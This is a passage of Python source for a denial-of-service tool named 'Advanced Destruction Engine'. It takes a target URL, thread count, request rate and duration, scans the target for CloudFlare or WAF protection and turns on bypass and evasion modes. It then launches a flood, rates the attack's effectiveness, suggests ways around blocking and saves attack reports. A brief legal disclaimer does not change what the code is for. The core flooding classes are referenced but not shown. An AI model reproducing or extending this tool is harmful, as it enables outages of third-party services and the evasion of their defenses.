        "[bold cyan]✨ ADVANCED FEATURES:[/]\n\n"
        "[green]✓[/] CloudFlare Protection Bypass\n"
        "[green]✓[/] WAF/IPS Evasion Techniques\n"
        "[green]✓[/] Adaptive Attack Strategies\n"
        "[green]✓[/] Human-like Request Patterns\n"
        "[green]✓[/] Real-time Protection Detection\n"
        "[green]✓[/] Smart Rate Limit Avoidance",
        border_style="bold blue",
        padding=(1, 2)
    )
    
    console.print(features)

def get_target():
    """Get target URL from user"""
    console.print("\n[bold cyan]🎯 TARGET CONFIGURATION[/]")
    console.print("[yellow]Enter target URL (with http:// or https://)[/]")
    console.print("[green]Examples:[/]")
    console.print("  • https://example.com")
    console.print("  • http://192.168.1.1:8080")
    console.print("  • http://test.com/admin")
    console.print("  • https://cloudflare-protected-site.com")
    
    while True:
        target_url = input("\n👉 Target URL: ").strip()
        
        if not target_url:
            console.print("[red]✗ Target URL cannot be empty![/]")
            continue
        
        # Validate URL
        if not (target_url.startswith('http://') or target_url.startswith('https://')):
            console.print("[yellow]⚠️  Adding http:// prefix[/]")
            target_url = 'http://' + target_url
        
        return target_url

def configure_attack():
    """Configure attack parameters"""
    console.print("\n[bold cyan]⚙️  ADVANCED CONFIGURATION[/]")
    
    # Threads
    while True:
        threads = input(f"Number of threads [{Config.MAX_THREADS}]: ").strip()
        if not threads:
            break
        if threads.isdigit() and int(threads) > 0:
            Config.MAX_THREADS = int(threads)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    # RPS
    while True:
        rps = input(f"Requests per second [{Config.MAX_RPS}]: ").strip()
        if not rps:
            break
        if rps.isdigit() and int(rps) > 0:
            Config.MAX_RPS = int(rps)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    # Duration
    while True:
        duration = input(f"Attack duration in seconds [{Config.ATTACK_DURATION}]: ").strip()
        if not duration:
            break
        if duration.isdigit() and int(duration) > 0:
            Config.ATTACK_DURATION = int(duration)
            break
        console.print("[red]✗ Please enter a valid number![/]")
    
    # WAF bypass
    waf_bypass = input(f"Enable WAF bypass? (y/n) [y]: ").strip().lower()
    Config.ENABLE_WAF_BYPASS = waf_bypass != 'n'
    
    # Human-like delays
    human_delays = input(f"Enable human-like delays? (y/n) [y]: ").strip().lower()
    Config.HUMAN_LIKE_DELAYS = human_delays != 'n'
    
    console.print(f"\n[green]✓ Configuration saved:[/]")
    console.print(f"  • Threads: {Config.MAX_THREADS}")
    console.print(f"  • RPS Limit: {Config.MAX_RPS}")
    console.print(f"  • Duration: {Config.ATTACK_DURATION}s")
    console.print(f"  • WAF Bypass: {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
    console.print(f"  • Human-like: {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")

async def run_smart_attack(target_url):
    """Run smart attack with protection bypass"""
    # Parse target
    target = TargetInfo(target_url)
    if not target.parse():
        console.print("[red]✗ Failed to parse target URL![/]")
        return
    
    AttackMonitor.current_target = f"{target.protocol}://{target.host}:{target.port}"
    
    # Advanced scanning and detection
    with console.status("[bold green]🔍 Scanning target for protections...[/]") as status:
        if target.scan_and_detect():
            console.print("[green]✅ Target scan completed![/]")
            
            # Show detected technologies
            if target.technologies:
                tech_text = ", ".join(target.technologies[:5])
                if len(target.technologies) > 5:
                    tech_text += f" and {len(target.technologies)-5} more"
                console.print(f"[cyan]Technologies:[/] {tech_text}")
            
            # Show protection status
            if target.protection_detected:
                console.print(f"[red]⚠️  PROTECTION DETECTED: {target.protection_type.upper()}[/]")
                
                # Adjust configuration for protected sites
                if target.protection_type in ['cloudflare', 'captcha']:
                    Config.MAX_RPS = min(Config.MAX_RPS, 1000)
                    Config.REQUEST_TIMEOUT = 25
                    console.print("[yellow]🔧 Adjusting configuration for protected site...[/]")
                    console.print(f"[yellow]   • Max RPS reduced to: {Config.MAX_RPS}[/]")
                    console.print(f"[yellow]   • Timeout increased to: {Config.REQUEST_TIMEOUT}s[/]")
            
            # Show vulnerabilities
            if target.vulnerabilities:
                console.print(f"[yellow]🔓 Potential vulnerabilities:[/] {', '.join(target.vulnerabilities[:3])}")
        
        else:
            console.print("[yellow]⚠️  Target scan failed, proceeding with basic detection[/]")
    
    # Create smart attack manager
    manager = SmartAttackManager(target)
    
    # Start monitor
    monitor_thread = threading.Thread(target=AttackMonitor.display_dashboard, daemon=True)
    monitor_thread.start()
    
    # Start attack
    AttackState.attacking = True
    AttackState.start_time = time.time()
    
    console.print(f"\n[bold red]🚀 LAUNCHING SMART ATTACK ON {target.host}...[/]")
    
    if target.protection_detected:
        console.print(f"[yellow]🛡️  Using advanced {target.protection_type.upper()} bypass techniques[/]")
    
    console.print("[yellow]Press Ctrl+C to stop the attack[/]")
    
    # Countdown
    console.print("[yellow]Starting in:[/]")
    for i in range(3, 0, -1):
        console.print(f"[red]{i}...[/]")
        time.sleep(1)
    
    try:
        await manager.start_smart_attack(Config.MAX_THREADS)
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Attack interrupted by user[/]")
    except Exception as e:
        console.print(f"[red]✗ Attack error: {e}[/]")
    finally:
        AttackState.attacking = False
        time.sleep(1)  # Wait for monitor to update
        
        # Show final report
        show_final_report(target)
        def show_final_report(target):
    """Show comprehensive final attack report"""
    stats = AttackMonitor.calculate_stats()
    
    # Calculate additional metrics
    total_time = stats['elapsed_time']
    hours = total_time // 3600
    minutes = (total_time % 3600) // 60
    seconds = total_time % 60
    
    avg_rps = stats['total_requests'] / max(total_time, 1)
    block_rate = (stats['blocked'] / max(stats['total_requests'], 1)) * 100
    error_rate = (stats['errors'] / max(stats['total_requests'], 1)) * 100
    
    # Protection analysis
    protection_analysis = ""
    if stats['cloudflare_detected']:
        protection_analysis = "[red]☁️ CLOUDFLARE PROTECTION ACTIVE[/] - Advanced bypass techniques used"
    elif stats['waf_detected']:
        protection_analysis = "[yellow]🛡️ WAF PROTECTION ACTIVE[/] - Evasion techniques applied"
    else:
        protection_analysis = "[green]✅ NO MAJOR PROTECTION DETECTED[/]"
    
    report = f"""
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║                     ATTACK COMPLETE - DETAILED REPORT                    ║
    ╠══════════════════════════════════════════════════════════════════════════╣
    ║                                                                          ║
    ║  🎯 [bold cyan]TARGET INFORMATION[/]                                      ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  URL:          {target.protocol}://{target.host}:{target.port:<30} ║
    ║  IP Address:   {target.ip:<40} ║
    ║  Protection:   {protection_analysis:<30} ║
    ║                                                                          ║
    ║  ⏱️  [bold cyan]TIME STATISTICS[/]                                        ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Total Duration:   {hours:02d}:{minutes:02d}:{seconds:02d} (HH:MM:SS)          ║
    ║  Average RPS:      {avg_rps:,.1f} requests/second{'':<20} ║
    ║  Peak RPS:         {stats['peak_rps']:,} requests/second{'':<20} ║
    ║                                                                          ║
    ║  📊 [bold cyan]REQUEST STATISTICS[/]                                      ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Total Requests:   {stats['total_requests']:,}{'':<30} ║
    ║  Successful:       {stats['successful']:,} ({stats['success_rate']:.1f}%){'':<20} ║
    ║  Blocked:          {stats['blocked']:,} ({block_rate:.1f}%){'':<20} ║
    ║  Errors:           {stats['errors']:,} ({error_rate:.1f}%){'':<20} ║
    ║                                                                          ║
    ║  💾 [bold cyan]DATA TRANSFER[/]                                          ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Sent:             {stats['bytes_sent_mb']:.1f} MB{'':<35} ║
    ║  Received:         {stats['bytes_recv_mb']:.1f} MB{'':<35} ║
    ║  Bandwidth (Avg):  ▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s{'':<10} ║
    ║                                                                          ║
    ║  🔧 [bold cyan]CONFIGURATION USED[/]                                      ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Threads:          {Config.MAX_THREADS}{'':<40} ║
    ║  Max RPS:          {Config.MAX_RPS:,}{'':<40} ║
    ║  WAF Bypass:       {'ENABLED' if Config.ENABLE_WAF_BYPASS else 'DISABLED'}{'':<40} ║
    ║  Human-like Mode:  {'ENABLED' if Config.HUMAN_LIKE_DELAYS else 'DISABLED'}{'':<40} ║
    ║                                                                          ║
    ║  🌐 [bold cyan]NETWORK INFORMATION[/]                                     ║
    ║  ────────────────────────────────────────────────────────────────        ║
    ║  Unique IPs Used:  {stats['unique_ips']}{'':<40} ║
    ║  SSL Enabled:      {'YES' if target.ssl_enabled else 'NO'}{'':<40} ║
    ║                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    """
    
    console.print(Panel.fit(report, border_style="bold green", padding=(1, 2)))
    
    # Show attack effectiveness analysis
    show_effectiveness_analysis(stats, target)

def show_effectiveness_analysis(stats, target):
    """Show attack effectiveness analysis"""
    
    effectiveness = ""
    recommendations = []
    
    # Analyze success rate
    if stats['success_rate'] >= 80:
        effectiveness = "[bold green]EXCELLENT[/] - Attack was highly effective"
        recommendations.append("Maintain current configuration for similar targets")
    elif stats['success_rate'] >= 50:
        effectiveness = "[bold yellow]GOOD[/] - Attack was moderately effective"
        recommendations.append("Consider increasing threads for better performance")
    elif stats['success_rate'] >= 20:
        effectiveness = "[bold orange]FAIR[/] - Attack faced significant resistance"
        recommendations.append("Try different attack vectors or increase delays")
    else:
        effectiveness = "[bold red]POOR[/] - Attack was mostly blocked"
        recommendations.append("Target has strong protection, consider different approach")
    
    # Analyze block rate
    if stats['blocked'] > stats['successful']:
        recommendations.append("Target has active protection (WAF/CloudFlare)")
        recommendations.append("Use more human-like delays and random patterns")
    
    # Analyze bandwidth usage
    if stats['mbps_sent'] < 1.0:
        recommendations.append("Low bandwidth usage, consider increasing request size")
    
    analysis_panel = Panel.fit(
        f"[bold cyan]📈 ATTACK EFFECTIVENESS ANALYSIS[/]\n\n"
        f"[yellow]Overall Rating:[/] {effectiveness}\n"
        f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
        f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n\n"
        f"[bold yellow]💡 RECOMMENDATIONS:[/]\n"
        + "\n".join([f"  • {rec}" for rec in recommendations]),
        border_style="bold yellow",
        padding=(1, 2)
    )
    
    console.print(analysis_panel)
    
    # Save report to file
    save_report_to_file(stats, target, recommendations)

def save_report_to_file(stats, target, recommendations):
    """Save attack report to file"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"attack_report_{target.host}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("ADVANCED DESTRUCTION ENGINE - ATTACK REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Target: {target.protocol}://{target.host}:{target.port}\n")
            f.write(f"IP Address: {target.ip}\n")
            f.write(f"Attack Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write("-" * 60 + "\n")
            f.write("STATISTICS\n")
            f.write("-" * 60 + "\n")
            f.write(f"Total Requests: {stats['total_requests']:,}\n")
            f.write(f"Successful: {stats['successful']:,} ({stats['success_rate']:.1f}%)\n")
            f.write(f"Blocked: {stats['blocked']:,}\n")
            f.write(f"Errors: {stats['errors']:,}\n")
            f.write(f"Duration: {stats['elapsed_time']} seconds\n")
            f.write(f"Average RPS: {stats['total_requests']/max(stats['elapsed_time'],1):.1f}\n")
            f.write(f"Peak RPS: {stats['peak_rps']:,}\n")
            f.write(f"Data Sent: {stats['bytes_sent_mb']:.1f} MB\n")
            f.write(f"Data Received: {stats['bytes_recv_mb']:.1f} MB\n\n")
            
            f.write("-" * 60 + "\n")
            f.write("CONFIGURATION\n")
            f.write("-" * 60 + "\n")
            f.write(f"Threads: {Config.MAX_THREADS}\n")
            f.write(f"Max RPS: {Config.MAX_RPS}\n")
            f.write(f"WAF Bypass: {'Enabled' if Config.ENABLE_WAF_BYPASS else 'Disabled'}\n")
            f.write(f"Human-like Mode: {'Enabled' if Config.HUMAN_LIKE_DELAYS else 'Disabled'}\n\n")
            
            f.write("-" * 60 + "\n")
            f.write("RECOMMENDATIONS\n")
            f.write("-" * 60 + "\n")
            for rec in recommendations:
                f.write(f"• {rec}\n")
            
            f.write("\n" + "=" * 60 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 60 + "\n")
        
        console.print(f"[green]📄 Report saved to: {filename}[/]")
        
    except Exception as e:
        console.print(f"[yellow]⚠️  Could not save report: {e}[/]")

def main():
    """Main function"""
    try:
        show_banner()
        
        # Legal disclaimer
        disclaimer = Panel.fit(
            "[bold red]⚠️  LEGAL DISCLAIMER[/]\n\n"
            "[yellow]This tool is for EDUCATIONAL and AUTHORIZED testing ONLY![/]\n"
            "[cyan]By using this tool, you agree to:[/]\n"
            "1. Use only on systems you own or have explicit permission to test\n"
            "2. Comply with all applicable laws and regulations\n"
            "3. Accept full responsibility for your actions\n"
            "4. Not use for malicious purposes\n\n"
            "[green]Press Enter to accept and continue...[/]",
            border_style="bold red",
            padding=(1, 2)
        )
        
        console.print(disclaimer)
        input()
        
        # Get target
        target_url = get_target()
        
        # Configure attack
        configure_attack()
        
        # Final confirmation
        console.print(f"\n[bold yellow]⚠️  FINAL CONFIRMATION[/]")
        console.print(f"[cyan]Target:[/] {target_url}")
        console.print(f"[cyan]Threads:[/] {Config.MAX_THREADS}")
        console.print(f"[cyan]RPS Limit:[/] {Config.MAX_RPS}")
        console.print(f"[cyan]Duration:[/] {Config.ATTACK_DURATION}s")
        console.print(f"[cyan]WAF Bypass:[/] {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
        console.print(f"[cyan]Human-like:[/] {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")
        
        confirm = input("\n👉 Type 'START' to launch attack, anything else to cancel: ").strip().upper()
        
        if confirm != 'START':
            console.print("[yellow]✗ Attack cancelled[/]")
            return
        
        # Run attack
        asyncio.run(run_smart_attack(target_url))
        
        # Ask for another attack
        restart = input("\n👉 Launch another attack? (y/n): ").strip().lower()
        if restart == 'y':
            # Reset stats
            AttackState.stats = {
                'total_requests': 0,
                'successful': 0,
                'blocked': 0,
                'errors': 0,
                'bytes_sent': 0,
                'bytes_received': 0,
                'peak_rps': 0,
                'current_rps': 0,
                'targets_hit': 0,
                'unique_ips': set(),
                'waf_detected': False,
                'cloudflare_detected': False
            }
            AttackState.last_count = 0
            AttackState.attacking = False
            AttackState.start_time = 0
            
            # Clear screen and restart
            os.system('clear' if os.name == 'posix' else 'cls')
            main()
        else:
            console.print("\n[bold green]👋 Thank you for using Advanced Destruction Engine v6.0![/]")
            console.print("[yellow]Remember: Use this tool only for authorized testing![/]")
            console.print("[cyan]GitHub: https://github.com/Irfan430/crackar[/]")
            sys.exit(0)
            
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Program interrupted by user[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]✗ Unexpected error: {e}[/]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Check and install missing dependencies
    try:
        import requests
    except ImportError:
        console.print("[yellow]⚠️  'requests' module not found. Installing...[/]")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    
    # Check for rich library
    try:
        from rich import print
    except ImportError:
        console.print("[yellow]⚠️  'rich' module not found. Installing...[/]")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
    
    # Check for aiohttp
    try:
        import aiohttp
    except ImportError:
        console.print("[yellow]⚠️  'aiohttp' module not found. Installing...[/]")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
    
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]👋 Exiting Advanced Destruction Engine...[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]✗ Fatal error: {e}[/]")
        console.print("[yellow]Troubleshooting steps:[/]")
        console.print("1. Install requirements: pip install rich aiohttp colorama requests")
        console.print("2. Check Python version (3.7+ required)")
        console.print("3. Run with: python crackar.py")
        console.print("4. Report issues: https://github.com/Irfan430/crackar/issues")
        sys.exit(1)